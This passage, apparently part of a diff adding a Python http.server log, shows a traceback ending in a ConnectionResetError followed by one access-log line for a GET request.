+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+18.206.157.75 - - [31/Aug/2026 06:03:04] "GET / HTTP/1.1" 200 -
